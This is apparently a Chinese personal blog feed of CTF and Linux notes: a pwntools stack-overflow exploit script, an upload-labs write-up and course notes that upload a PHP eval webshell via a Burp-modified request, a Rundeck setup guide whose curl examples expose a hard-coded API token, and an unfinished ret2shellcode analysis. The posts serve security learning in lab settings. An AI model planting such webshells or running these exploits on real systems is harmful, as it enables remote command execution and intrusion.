information.<br>&gt;&gt;&gt; 0x00007ffce74962b0 - 0x00007ffce7496290<br>32<br><br></code></pre></td></tr></table></figure><p>上面已经找到system(“&#x2F;bin&#x2F;sh”);的地址为：0x00000000004008C4</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># io = remote(&quot;xxxx&quot;, 9999)  </span><br> <br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &quot;debug&quot;</span><br><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span> + <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>return_addr = <span class="hljs-number">0x00000000004008C4</span><br>payload = padding + p64(return_addr)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Input: &#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf题目系列】upload-labs靶场 web 文件上传漏洞</title>
    <link href="/2023/08/24/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91upload-labs%E9%9D%B6%E5%9C%BA%20web%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/ctf/unsupported/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91upload-labs%E9%9D%B6%E5%9C%BA%20web%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/c0ny1/upload-labs">upload-labs github链接</a></p><h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p><a href="https://cloud.tencent.com/developer/article/2196769">phpStudy 2016搭建-upload-labs靶场</a></p><h1 id="01"><a href="#01" class="headerlink" title="01"></a>01</h1><p>直接在浏览器源代码的位置修改不成功，所以选择在burp上进行尝试<br>将shell.php改为shell.png，上传该png图片，用burp拦截<br>修改filename为shell.php</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Pass-01/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.20.201<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>317<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://192.168.20.201<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryeHo9xtvBYEh3wzgK<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://192.168.20.201/Pass-01/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=node01ked3r2wvuewui081fs0tsx7517.node0<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-php">------WebKitFormBoundaryeHo9xtvBYEh3wzgK</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;upload_file&quot;</span>; filename=<span class="hljs-string">&quot;shell.php&quot;</span></span><br><span class="language-php">Content-Type: image/png</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span></span><br><span class="language-php">------WebKitFormBoundaryeHo9xtvBYEh3wzgK</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;submit&quot;</span></span><br><span class="language-php"></span><br><span class="language-php">上传</span><br><span class="language-php">------WebKitFormBoundaryeHo9xtvBYEh3wzgK--</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf学习系列】WebShell与文件上传漏洞</title>
    <link href="/2023/08/24/ctf/%E3%80%90ctf%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E3%80%91WebShell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/ctf/%E3%80%90ctf%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97%E3%80%91WebShell%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p><a href="https://www.bilibili.com/video/BV1qb4y1J7LK/?p=4&spm_id_from=pageDriver">B站视频</a><br>该博客内容为B站视频所对应的ppt，仅作笔记使用，如有侵权，请联系处理~</p><h2 id="课件内容"><a href="#课件内容" class="headerlink" title="课件内容"></a>课件内容</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824095009.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824075534.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[x]);&gt;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824075600.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824075815.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824080049.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824080141.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824080214.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824080517.png" alt="image.png"></p><p>蚁剑不支持edu.cn，可以用哥斯拉Godzilla软件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081206.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081236.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081316.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081357.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081522.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081708.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824081839.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083045.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083148.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083224.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083435.png" alt="image.png"></p><p>010eidtor打开一个文件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083413.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083451.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083650.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824083721.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824092944.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824093126.png" alt="image.png"><br>::DATA  作为一个数据流</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824093244.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824093548.png" alt="image.png"></p><p>20改成00，会存在一个空字符</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094308.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094335.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094617.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094630.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094656.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094741.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230824094943.png" alt="image.png"></p><p>安装哥斯拉<br>burp中为什么没有render<br>常用的mime</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202308) ubuntu18.04虚拟机中安装Rundeck</title>
    <link href="/2023/08/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202308)%20ubuntu18.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%AE%89%E8%A3%85Rundeck/"/>
    <url>/2023/08/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202308)%20ubuntu18.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%AD%E5%AE%89%E8%A3%85Rundeck/</url>
    
    <content type="html"><![CDATA[<h2 id="下载、安装"><a href="#下载、安装" class="headerlink" title="下载、安装"></a>下载、安装</h2><p><a href="https://www.rundeck.com/downloads">Rundeck</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823145827.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan rundeck]<span class="hljs-comment"># apt-get install openjdk-8-jdk-headless</span><br>[root@ningan rundeck]<span class="hljs-comment"># dpkg -i rundeck_4.15.0.20230725-1_all.deb</span><br></code></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[root@ningan rundeck]<span class="hljs-comment"># /etc/init.d/rundeckd start</span><br>[ ok ] Starting rundeckd (via systemctl): rundeckd.service.<br>[root@ningan rundeck]<span class="hljs-comment">#</span><br><br>[root@ningan rundeck]<span class="hljs-comment"># ps -ef |grep runde</span><br>rundeck   6677     1 99 14:52 ?        00:01:28 java -Drundeck.jaaslogin=<span class="hljs-literal">true</span> -Djava.security.auth.login.config=/etc/rundeck/jaas-loginmodule.conf -Dloginmodule.name=RDpropertyfilelogin -Drdeck.config=/etc/rundeck -Drundeck.server.configDir=/etc/rundeck -Dserver.datastore.path=/var/lib/rundeck/data/rundeck -Drundeck.server.serverDir=/var/lib/rundeck -Drdeck.projects=/var/lib/rundeck/projects -Dlog4j.configurationFile=/etc/rundeck/log4j2.properties -Dlogging.config=file:/etc/rundeck/log4j2.properties -Drdeck.runlogs=/var/lib/rundeck/logs -Drundeck.server.logDir=/var/lib/rundeck/logs -Drundeck.config.location=/etc/rundeck/rundeck-config.properties -Djava.io.tmpdir=/tmp/rundeck -Drundeck.server.workDir=/tmp/rundeck -Dserver.http.port=4440 -Drdeck.base=/var/lib/rundeck -Xmx1024m -Xms256m -XX:MaxMetaspaceSize=256m -server -jar /var/lib/rundeck/bootstrap/rundeck-4.15.0-20230725.war --skipinstall<br>root      7234 25419  0 14:53 pts/0    00:00:00 grep --color=auto runde<br><br><br><span class="hljs-comment">### 注意：启动之后，得过一会才能看到这个端口占用</span><br>[root@ningan rundeck]<span class="hljs-comment"># netstat -nltp |grep 4440</span><br>tcp6       0      0 :::4440                 :::*                    LISTEN      6677/java<br><br></code></pre></td></tr></table></figure><p>在宿主机上访问：<a href="http://192.168.20.201:4440/">http://192.168.20.201:4440/</a> 进行访问，用户名和密码都输入admin，一直在转圈圈进不去。后来找了网上的博客，在访问前需要修改配置文件&#x2F;etc&#x2F;rundeck&#x2F;rundeck-config.properties<br>修改这一行，</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">将<br>grails.serverURL=http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">4440</span><br>修改为<br>grails.serverURL=http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">20.201</span>:<span class="hljs-number">4440</span><br></code></pre></td></tr></table></figure><p>修改完之后，重启 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan rundeck]<span class="hljs-comment"># /etc/init.d/rundeckd restart</span><br><br><span class="hljs-comment">### 注意：启动之后，得过一会才能看到这个端口占用</span><br>[root@ningan rundeck]<span class="hljs-comment"># netstat -nltp |grep 4440</span><br>tcp6       0      0 :::4440                 :::*                    LISTEN      6677/java<br><br></code></pre></td></tr></table></figure><p>等4440已经启动起来了，再次在浏览器中访问，就能进去了~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823151254.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823151235.png" alt="image.png"></p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">rundeckd [start|<span class="hljs-type">stop</span>|<span class="hljs-type">restart</span>|<span class="hljs-type">condrestart</span>|<span class="hljs-type">status</span>]<br></code></pre></td></tr></table></figure><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="创建token"><a href="#创建token" class="headerlink" title="创建token"></a>创建token</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823165813.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230823165839.png" alt="image.png"></p><h2 id="常用接口操作"><a href="#常用接口操作" class="headerlink" title="常用接口操作"></a>常用接口操作</h2><h3 id="查询project的列表信息"><a href="#查询project的列表信息" class="headerlink" title="查询project的列表信息"></a>查询project的列表信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># - 缺省方式：返回XML的结果</span><br><span class="hljs-comment"># curl http://192.168.20.201:4440/api/30/projects?authtoken=xxx</span><br><br><span class="hljs-comment"># - 设定Accept：指定返回json格式</span><br><span class="hljs-comment"># curl http://192.168.20.201:4440/api/30/projects?authtoken=xxx -H &quot;Accept: application/json&quot; |jq</span><br></code></pre></td></tr></table></figure><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取特定项目中的作业列表</span><br>GET /api/30/project/:project/jobs<br>curl  http://192.168.20.201:4440/api/30/project/paas/jobs?authtoken=NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp  -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><br><span class="hljs-comment"># 触发执行一个特定的作业。</span><br>POST /api/32/job/:jobId/executions<br>curl -X POST <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/job/1411fc5a-fdd5-45b3-b4c2-fa2737aae459/executions&quot;</span> -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token: NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><br>curl  http://192.168.20.201:4440/api/30/project/paas/executions?authtoken=NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp  -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><span class="hljs-comment"># 这个接口可以用来获取特定执行的输出信息</span><br>curl  http://192.168.20.201:4440/api/30/execution/5/output?authtoken=NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp  -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><span class="hljs-comment"># 查询某个作业下的所有执行</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=ls&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br><br><span class="hljs-comment"># 查询某个作业下的执行列表，并根据时间戳找到最近的执行</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=ls&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq <span class="hljs-string">&#x27;.executions | sort_by(.dateEnded) | reverse | .[-1]&#x27;</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=ls&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq <span class="hljs-string">&#x27;.executions | sort_by(.dateEnded) | last&#x27;</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=ls&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq <span class="hljs-string">&#x27;.executions | sort_by(.dateEnded) | reverse | .[0]&#x27;</span><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/project/paas/executions?jobFilter=execEchoShell&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq <span class="hljs-string">&#x27;.executions | sort_by(.dateEnded) | reverse | .[0]&#x27;</span><br><br>curl -X GET <span class="hljs-string">&quot;http://192.168.20.201:4440/api/30/execution/33/output&quot;</span>  -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token:NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp&quot;</span> -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> <br><br>curl -s -H <span class="hljs-string">&quot;X-Rundeck-Auth-Token: YOUR_AUTH_TOKEN&quot;</span> <span class="hljs-string">&quot;http://RUNDECK_SERVER/api/14/execution/EXECUTION_ID/output&quot;</span><br><br><br>curl http://192.168.20.201:4440/api/30/project/paas/executions?authtoken=NdUB89tWpe87NFmUhRyCX9V6ZDie1HDp  -H <span class="hljs-string">&quot;Accept: application/json&quot;</span> |jq<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf】安全机制</title>
    <link href="/2023/08/21/ctf/unsupported/%E3%80%90ctf%E3%80%91%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/08/21/ctf/unsupported/%E3%80%90ctf%E3%80%91%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h2><p>NX 即 No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><p>windows：DEP<br>linux：NX</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf题目系列】ctfwiki pwn类型 栈溢出</title>
    <link href="/2023/08/21/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfwiki%20pwn%E7%B1%BB%E5%9E%8B%20%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2023/08/21/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfwiki%20pwn%E7%B1%BB%E5%9E%8B%20%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2shellcode]<span class="hljs-comment"># ./ret2shellcode</span><br>No system <span class="hljs-keyword">for</span> you this time !!!<br>123<br><span class="hljs-built_in">bye</span> <span class="hljs-built_in">bye</span> ~[root@ningan ret2shellcode]<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h2 id="checksec检查"><a href="#checksec检查" class="headerlink" title="checksec检查"></a>checksec检查</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ret2shellcode]<span class="hljs-comment"># checksec ret2shellcode</span><br>[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)<br>[*] <span class="hljs-string">&#x27;/root/ctf/ctfwiki/ret2shellcode/ret2shellcode&#x27;</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></table></figure><p>32位程序<br>NX disabled &#x3D; 可以将shellcode放在数据段，即可执行</p><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br><br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No system for you this time !!!&quot;</span>);<br>  gets(s);<br>  <span class="hljs-built_in">strncpy</span>(buf2, s, <span class="hljs-number">0x64</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bye bye ~&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>栈溢出漏洞，还同时将对应的字符串复制到 buf2 处</p><p>查看buf2，发现在bss段</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.<span class="hljs-symbol">bss:</span>0804A065 <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span>+align 20h<br>.<span class="hljs-symbol">bss:</span>0804A080                               <span class="hljs-keyword">public</span> buf2<br>.<span class="hljs-symbol">bss:</span>0804A080                               ; char buf2[<span class="hljs-number">100</span>]<br>.<span class="hljs-symbol">bss:</span>0804A080 <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span> <span class="hljs-string">??</span>+buf2 db 64h dup(<span class="hljs-string">?)</span>                      ; <span class="hljs-variable constant_">DATA</span> <span class="hljs-variable constant_">XREF</span>: 